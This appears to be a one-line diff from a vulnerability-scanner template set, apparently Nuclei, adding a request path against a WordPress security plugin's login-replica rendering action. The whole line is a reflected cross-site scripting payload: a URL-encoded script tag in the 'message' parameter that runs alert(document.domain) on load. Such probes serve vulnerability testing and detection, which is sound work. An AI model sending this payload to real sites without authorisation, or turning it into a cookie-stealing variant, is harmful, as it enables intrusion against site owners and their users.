@@ -1,0 +1,1 @@
+/?action=shield_action&ex=display_full_page_dynamic&render_slug=render_shield_wploginreplica_header&title=nuclei&message=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
